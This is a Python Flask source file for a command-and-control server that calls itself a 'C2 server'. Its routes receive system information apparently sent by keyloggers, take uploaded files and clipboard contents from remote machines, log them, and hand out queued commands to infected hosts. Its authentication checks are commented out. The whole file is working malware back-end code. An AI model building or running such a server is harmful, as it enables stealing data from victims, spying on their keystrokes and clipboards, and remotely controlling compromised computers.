from flask import Flask, request, jsonify
import os
from datetime import datetime

app = Flask(__name__)
UPLOAD_FOLDER = "uploads"
os.makedirs(UPLOAD_FOLDER, exist_ok=True)
LOG_FILE = "c2_server.log"
CLIPBOARD_LOG = "clipboard.log"
AUTH_TOKEN = "supersecrettoken"
commands = ["CALC"]

def log_data(data, filename):
    with open(filename, "a") as f:
        f.write(f"[{datetime.now()}] {data}\n")

def authenticate():
    token = request.headers.get("Authorization")
    if token != f"Bearer {AUTH_TOKEN}":
        return jsonify({"error": "Unauthorized"}), 403

@app.route("/keys", methods=["POST"])
def receive_system_info():
    # auth = authenticate()
    # if auth:
    #     return auth
    data = request.json
    log_data(f"System Info from {request.remote_addr}: {data}", LOG_FILE)
    return jsonify({"status": "received"})

@app.route("/uploads", methods=["POST"])
def receive_files():
    # auth = authenticate()
    # if auth:
    #     return auth
    if "file" not in request.files:
        return jsonify({"error": "No file uploaded"}), 400
    uploaded_file = request.files["file"]
    filename = f"{request.remote_addr}_{datetime.now().strftime('%Y%m%d_%H%M%S')}_{uploaded_file.filename}"
    filepath = os.path.join(UPLOAD_FOLDER, filename)
    uploaded_file.save(filepath)
    log_data(f"File received: {filename}", LOG_FILE)
    return jsonify({"status": "file received", "filename": filename})

@app.route("/cmd", methods=["GET", "POST"])
def manage_commands():
    # auth = authenticate()
    # if auth:
    #     return auth
    global commands
    if request.method == "POST":
        cmd = request.json.get("command")
        if cmd:
            commands.append(cmd)
            log_data(f"Command added: {cmd}", LOG_FILE)
            return jsonify({"status": "command added"})
    elif request.method == "GET":
        return jsonify({"commands": commands})
    return jsonify({"error": "Invalid request"}), 400

@app.route("/api/clip", methods=["POST"])
def receive_clipboard():
    try:
        data = request.get_json()
        if not data:
            return jsonify({"error": "Invalid JSON format"}), 400

        ip = request.remote_addr
        print(f"Received clipboard data from {ip}: {data}")

        return jsonify({"status": "clipboard data received"})

    except Exception as e:
        return jsonify({"error": str(e)}), 500



@app.route("/status", methods=["GET"])
def status():
    # auth = authenticate()
    # if auth:
    #     return auth
    return jsonify({"status": "C2 server running", "total_commands": len(commands)})

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=1224, debug=False)
